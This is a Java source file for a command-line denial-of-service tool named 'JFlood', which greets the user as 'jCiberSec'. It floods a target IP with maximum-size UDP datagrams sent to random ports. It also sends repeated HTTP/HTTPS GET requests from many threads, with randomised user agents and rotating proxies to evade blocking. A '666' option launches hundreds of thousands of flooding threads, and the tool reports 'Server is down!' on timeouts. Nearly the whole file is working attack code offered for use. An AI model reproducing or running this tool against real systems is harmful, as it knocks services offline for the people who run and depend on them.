package jflood;

/**
 *
 * @author Slam
 */
import java.io.IOException;
import java.net.*;
import java.util.Scanner;
import javax.net.ssl.HttpsURLConnection;

public class JFlood {

    private static final int MAX_PACKET_SIZE = 65534;
    private static final int PHI = 0x9e3779b9;
    private static int count = 0;
    private static final int c = 362436;
    private static volatile int limiter;
    private static volatile int pps;
    private static volatile int sleeptime = 100;

    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);
        while (true) {
            myMain(in);
        }
    }

    private static void myMain(Scanner in) {

        System.out.println("Welcome to jCiberSec");
        System.out.println("---- MENU ----");
        System.out.println("1. to threath web with DDOS");
        System.out.println("2. to threath UDP-IP target with DDOS");
        System.out.println("666. to full Attack");
        System.out.println("0. to exit");
        int opc = in.nextInt();
        switch (opc) {
            case 666:
                System.out.println("Type the URL or IP of the target");
                String target = in.next().concat(in.nextLine());
                System.out.println("Wait until the program load the armors...");
                do666(target);
                System.out.println("Job done!");
                break;
            case 2:
                System.out.println("Usage: <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>");
                /*
                    if (args.length < 4) {
                    System.out.println("Usage: <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>");
                    System.exit(-1);
                    }*/
                final String targetIP = in.next().concat(in.nextLine());//args[0];
                int numThreads = in.nextInt();//Integer.parseInt(args[1]);
                int maxpps = in.nextInt();//Integer.parseInt(args[2]);
                int time = in.nextInt();//Integer.parseInt(args[3]);
                limiter = 0;
                pps = 0;
                Thread[] threads = new Thread[numThreads];
                for (int i = 0; i < numThreads; i++) {
                    threads[i] = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            flood(targetIP);
                        }
                    });
                    threads[i].start();
                }
                System.out.println("Sending packets...");
                System.out.println("Started!");
                int multiplier = 100;
                for (int i = 0; i < time * multiplier; i++) {
                    try {
                        Thread.sleep((1000 / multiplier) * 1000);
                    } catch (InterruptedException e) {
                        System.out.println("InterruptedException: " + e.getMessage());
                    }
                    if ((pps * multiplier) > maxpps) {
                        if (1 > limiter) {
                            sleeptime += 100;
                        } else {
                            limiter--;
                        }
                    } else {
                        limiter++;
                        if (sleeptime > 25) {
                            sleeptime -= 25;
                        } else {
                            sleeptime = 0;
                        }
                    }
                    pps = 0;
                }
                break;
            case 1:
                System.out.println("Type the target URL");
                String lTarget = in.next().concat(in.nextLine());
                System.out.println("How many threads want: (100 - default)");
                int treads = in.nextInt();
                System.out.println("Using proxy? (y/n)");
                String withProxy = in.next();
                System.out.println("Starting attack!");
                if (withProxy.charAt(0) == 'y' || withProxy.charAt(0) == 's' || withProxy.charAt(0) == 'Y' || withProxy.charAt(0) == 'S') {
                    cloudFuck(lTarget, treads, true);
                } else {
                    cloudFuck(lTarget, treads, false);
                }
                System.out.println("Attack done!");
                break;
            case 0:
                System.out.println("See ya!");
                System.exit(opc);
            default:
                break;
        }
    }

    private static void flood(String targetIP) {
        try {
            byte[] datagram = new byte[MAX_PACKET_SIZE];
            InetAddress addr = InetAddress.getByName(targetIP);
            DatagramSocket socket = new DatagramSocket();

            while (true) {
                DatagramPacket packet = new DatagramPacket(datagram, datagram.length, addr, getRandomPort());
                socket.send(packet);

                pps++;
                if (limiter >= 0 && limiter <= pps) {
                    Thread.sleep(sleeptime);
                }
            }
        } catch (IOException | InterruptedException e) {
            System.out.println("Exception: " + e.getMessage());
        }
    }

    private static int getRandomPort() {
        return (int) (Math.random() * 65535 + 1);
    }

    private static void cloudFHTTP(String attURL, int threads, boolean withProxy) {
        if (threads == 0) {
            threads = 100;
        }
        String localP = getProxys();
        HttpURLConnection connection;
        for (int i = 0; i < threads; i++) {
            String agent = Data.userAgents[(int) Math.floor(Math.random() * Data.userAgents.length)];
            try {
                URL url = new URL(attURL);
                if (withProxy) {
                    connection = (HttpURLConnection) url.openConnection(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(getProxy(localP), getPort(localP))));
                } else {
                    connection = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
                }
                connection.setRequestMethod("GET");
                connection.setRequestProperty("Host", url.getHost());
                connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                connection.setRequestProperty("User-Agent", agent);
                connection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
                connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
                connection.setRequestProperty("Cache-Control", "max-age=0");
                connection.setRequestProperty("Connection", "Keep-Alive");

                connection.connect();

                int responseCode = connection.getResponseCode();
                System.out.println("Request " + (i + 1) + " - Response Code: " + responseCode);

                connection.disconnect();
            } catch (IOException e) {
                if (e.getMessage().equals("Operation timed out (Connection timed out)")) {
                    count++;
                    if (count > 3) {
                        System.out.println("DDoS successful!\nServer is down!");
                        count = 0;
                        System.out.println("Do you want to stop?");

                    }
                } else {
                    System.out.println("IOE: " + e.getMessage());
                }
            }
        }
    }

    private static void cloudFHTTPS(String attURL, int threads, boolean withProx) {
        if (threads == 0) {
            threads = 100;
        }
        String localP = getProxys();
        HttpsURLConnection connection;
        for (int i = 0; i < threads; i++) {
            String agent = Data.userAgents[(int) Math.floor(Math.random() * Data.userAgents.length)];
            try {
                URL url = new URL(attURL);
                if (withProx) {
                    connection = (HttpsURLConnection) url.openConnection(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(getProxy(localP), getPort(localP))));
                } else {
                    connection = (HttpsURLConnection) url.openConnection(Proxy.NO_PROXY);
                }
                connection.setRequestMethod("GET");
                connection.setRequestProperty("Host", url.getHost());
                connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                connection.setRequestProperty("User-Agent", agent);
                connection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
                connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
                connection.setRequestProperty("Cache-Control", "max-age=0");
                connection.setRequestProperty("Connection", "Keep-Alive");

                connection.connect();

                int responseCode = connection.getResponseCode();
                System.out.println("Request " + (i + 1) + " - Response Code: " + responseCode);

                connection.disconnect();
            } catch (IOException e) {
                if (e.getMessage().equals("Operation timed out (Connection timed out)")) {
                    count++;
                    if (count > 3) {
                        System.out.println("DDoS successful!\nServer is down!");
                        count = 0;
                    }
                } else {
                    System.out.println("IOE: " + e.getMessage());
                }
            }
        }
    }

    private static void do666(final String target) {
        String regexIP = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";

        if (target.matches(regexIP)) {
            System.out.println("Starting UDP Flood DDOS");
            Thread[] threads = new Thread[c];
            for (int i = 0; i < c; i++) {
                threads[i] = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        flood(target);
                    }
                });
            }
            System.out.println("UDP done!");
        } else if (target.startsWith("https")) {
            System.out.println("Starting HTTPS DDoS");
            Thread[] threads = new Thread[c];
            for (int i = 0; i < c; i++) {
                threads[i] = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        cloudFHTTPS(target, c, false);
                        cloudFHTTPS(target, c, true);
                    }
                });
                threads[i].start();
            }
            System.out.println("DDoS done!");
        } else if (target.contains("http")) {
            System.out.println("Starting HTTP DDoS");
            Thread[] threads = new Thread[c];
            for (int i = 0; i < c; i++) {
                threads[i] = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        cloudFHTTP(target, c, false);
                        cloudFHTTP(target, c, true);
                    }
                });
                threads[i].start();
            }
            System.out.println("DDoS done!");
        }

    }

    private static void cloudFuck(String lTarget, int treads, boolean withProxy) {
        if (lTarget.startsWith("https")) {
            cloudFHTTPS(lTarget, treads, withProxy);
        } else if (lTarget.contains("http")) {
            cloudFHTTP(lTarget, treads, withProxy);
        }
    }

    private static String getProxys() {
        return Data.proxys[(int) Math.floor(Math.random() * Data.proxys.length)];
    }

    private static int getPort(String proxy) {
        return !proxy.isEmpty() ? Integer.parseInt(proxy.split(":")[1]) : 80;
    }

    private static String getProxy(String proxy) {
        return !proxy.isEmpty() ? proxy.split(":")[0] : "127.0.0.1";
    }

}
